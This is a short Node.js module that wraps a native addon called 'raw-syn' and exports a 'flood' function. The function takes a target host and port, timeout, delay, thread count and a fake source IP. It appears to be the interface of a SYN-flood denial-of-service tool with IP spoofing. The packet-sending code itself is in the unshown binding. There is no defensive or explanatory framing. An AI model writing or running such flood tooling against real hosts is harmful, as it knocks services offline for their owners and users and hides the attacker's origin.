const flood = require('bindings')('raw-syn');


module.exports = (host, port, timeout, delay, threads, fakeIp) => {
    flood.sendPacket(host, port, timeout, delay, threads, fakeIp);
};